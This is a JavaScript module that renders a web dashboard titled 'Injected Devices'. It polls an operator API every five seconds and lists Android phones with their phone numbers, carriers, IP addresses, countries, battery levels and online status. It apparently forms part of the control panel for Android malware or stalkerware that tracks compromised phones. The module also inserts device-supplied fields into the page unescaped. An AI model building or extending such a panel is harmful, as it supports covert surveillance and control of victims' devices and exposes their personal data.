import { layout } from './layout.js';

export function renderDashboard(user, title) {
  const body = `
<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:24px">
  <div>
    <h1 style="font-weight:400;font-size:22px;letter-spacing:.02em">Injected Devices</h1>
    <div class="muted" style="margin-top:4px">Live telemetry • auto-refresh every 5s</div>
  </div>
  <div style="display:flex;gap:8px">
    <button class="btn" onclick="refresh()">Refresh</button>
  </div>
</div>

<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));
 gap:12px;margin-bottom:24px">
  <div class="card" style="padding:14px">
    <div class="card-title" style="margin-bottom:6px">Total</div>
    <div id="st-total" style="font-size:26px;font-family:ui-monospace,monospace">—</div>
  </div>
  <div class="card" style="padding:14px">
    <div class="card-title" style="margin-bottom:6px">Online</div>
    <div id="st-online" style="font-size:26px;color:var(--green);font-family:ui-monospace,monospace">—</div>
  </div>
  <div class="card" style="padding:14px">
    <div class="card-title" style="margin-bottom:6px">Stale</div>
    <div id="st-stale" style="font-size:26px;color:var(--yellow);font-family:ui-monospace,monospace">—</div>
  </div>
  <div class="card" style="padding:14px">
    <div class="card-title" style="margin-bottom:6px">Dead</div>
    <div id="st-dead" style="font-size:26px;color:var(--red);font-family:ui-monospace,monospace">—</div>
  </div>
</div>

<div id="devices" class="g g2"></div>

<script>
function ago(ts){
  if(!ts) return '—';
  const d = Date.now() - ts;
  if(d < 60000) return Math.floor(d/1000)+'s ago';
  if(d < 3600000) return Math.floor(d/60000)+'m ago';
  if(d < 86400000) return Math.floor(d/3600000)+'h ago';
  return Math.floor(d/86400000)+'d ago';
}
function status(ts){
  const d = Date.now() - ts;
  if(d < 120000) return {c:'green', l:'ONLINE'};
  if(d < 900000) return {c:'yellow', l:'STALE'};
  return {c:'red', l:'OFFLINE'};
}
function batteryColor(b){
  if(b>=60) return 'var(--green)';
  if(b>=25) return 'var(--yellow)';
  return 'var(--red)';
}
async function refresh(){
  const r = await fetch('/api/op/devices');
  const j = await r.json();
  const devs = j.devices || [];
  document.getElementById('st-total').textContent = devs.length;
  let on=0, st=0, de=0;
  const el = document.getElementById('devices');
  el.innerHTML = devs.map(d => {
    const s = status(d.last_seen);
    if(s.l==='ONLINE') on++;
    else if(s.l==='STALE') st++;
    else de++;
    const batt = d.battery || 0;
    return \`
    <a href="/device/\${d.id}" class="card" style="display:block;padding:16px;
       transition:.15s;position:relative;overflow:hidden">
      <div style="display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:10px">
        <div>
          <div style="font-weight:600;font-size:15px">\${d.brand || '?'} \${d.model || '?'}</div>
          <div class="mono-sm" style="margin-top:2px">\${d.phone || '—'}</div>
        </div>
        <span class="badge badge-\${s.c}">\${s.l}</span>
      </div>
      <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:12px;
         padding-top:12px;border-top:1px solid var(--line);font-size:12px">
        <div>
          <div class="mono-sm">Android</div>
          <div class="mono">\${d.android || '?'} (SDK \${d.sdk || '?'})</div>
        </div>
        <div>
          <div class="mono-sm">Carrier</div>
          <div class="mono">\${d.carrier || '—'}</div>
        </div>
        <div>
          <div class="mono-sm">Battery</div>
          <div class="mono" style="color:\${batteryColor(batt)}">\${batt}%</div>
        </div>
        <div>
          <div class="mono-sm">Last seen</div>
          <div class="mono">\${ago(d.last_seen)}</div>
        </div>
      </div>
      <div style="margin-top:10px;display:flex;gap:8px">
        <span class="mono-sm">\${d.ip || ''}</span>
        <span class="mono-sm">·</span>
        <span class="mono-sm">\${d.country || '??'}</span>
      </div>
    </a>\`;
  }).join('');
  document.getElementById('st-online').textContent = on;
  document.getElementById('st-stale').textContent = st;
  document.getElementById('st-dead').textContent = de;
}
refresh();
setInterval(refresh, 5000);
</script>`;
  return layout({ title: 'Devices • ' + title, user, body, active: 'dash' });
}
